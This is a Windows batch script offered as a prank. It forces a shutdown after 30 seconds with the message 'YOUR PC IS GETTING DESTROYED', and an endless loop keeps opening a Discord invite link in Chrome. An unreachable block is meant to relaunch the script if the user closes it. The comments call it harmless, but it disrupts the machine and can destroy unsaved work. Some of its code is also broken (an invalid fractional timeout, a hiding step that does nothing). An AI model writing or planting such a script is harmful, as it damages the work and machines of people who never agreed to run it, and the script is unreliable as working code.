@echo off
:: ADD YOUR TITLE AND THE CUSTOM TEXT 
title CUSTOM TEXT
color 4F
echo CUSTOM TEXT

:: Hide the command prompt window
powershell -windowstyle hidden -command ""

:: Initiate shutdown in X seconds (now is 30) and write your custom message (it's a joke tho!)
shutdown -s -t 30 -c "YOUR PC IS GETTING DESTROYED" 


:: Infinite loop to keep opening the URL (change the value after the /t to have a custom timer)
:loop
start chrome "https://discord.gg/WExs74Mf"
timeout /t 0.1 /nobreak
goto loop

:: Make it harder to close by reopening itself if attempted to close
:reopen
start "" "%~f0"
exit



:: Made with Shine Solutions [use it careful, it is not harmful]